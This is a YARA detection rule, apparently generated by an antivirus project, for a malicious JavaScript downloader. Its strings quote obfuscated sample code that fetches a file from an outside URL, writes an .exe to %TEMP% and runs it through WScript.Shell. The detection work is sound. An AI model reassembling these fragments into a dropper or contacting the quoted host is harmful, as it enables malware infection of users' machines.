rule sig_20160401_08eb1079185c5b2d56bcd5427def1321 {
  meta:
    description = "datamaliciousorder - file 20160401_08eb1079185c5b2d56bcd5427def1321.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d60bb0edc04b8085aef00d1e0bca5d6e647415849b718a78dfd49f6564ebe58f"

  strings:
    $s1  = "FlsCxt[EnBtl](\"G\" + \"ET\", \"http://geetanjalifincorp.com/pqw9aso\", false);" fullword ascii
    $s2  = "function ShVwu(IeVcj, PoYo){BhuVhv = BhuVhv * 1; return IeVcj - PoYo;};" fullword ascii
    $s3  = "var EkkCnq = function YphSo() {return WScript[NnEsn](\"WScript\"+\".Shell\");}(), EtUsn = 11;" fullword ascii
    $s4  = "if (FlsCxt[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function AqZxr(){return HzxEs + \"\";};" fullword ascii
    $s6  = "function TfoEad() {return EkkCnq[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"FfHyPhk6.ex\" + \"e\";};" fullword ascii
    $s7  = "function RusFia() {return ((NsCf == true) && (NsCf == RwqAgh)) ? 1 : BhuVhv;};" fullword ascii
    $s8  = "var RwqAgh = false;" fullword ascii
    $s9  = "function FwMub(EbaAlz){EkkCnq[\"R\"+\"un\"](EbaAlz, BhuVhv, BhuVhv);};" fullword ascii
    $s10 = "function SdqXs()" fullword ascii
    $s11 = "RwqAgh = true; " fullword ascii
    $s12 = "var ZnLh = false;" fullword ascii
    $s13 = "return ShVwu(TfhChd, IvwGma);" fullword ascii
    $s14 = "}while (IgcVll);" fullword ascii
    $s15 = "function IqVh(GkqHnu) {var XuiByz = (1, 2, 3, 4, 5, GkqHnu); return XuiByz;};" fullword ascii
    $s16 = "var OlqPbm = new this[\"Date\"]();" fullword ascii
    $s17 = "function GfId(){return 23;};" fullword ascii
    $s18 = "function IeSyw(){return NnEsn;};" fullword ascii
    $s19 = "var NsCf = false;" fullword ascii
    $s20 = "NsCf = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}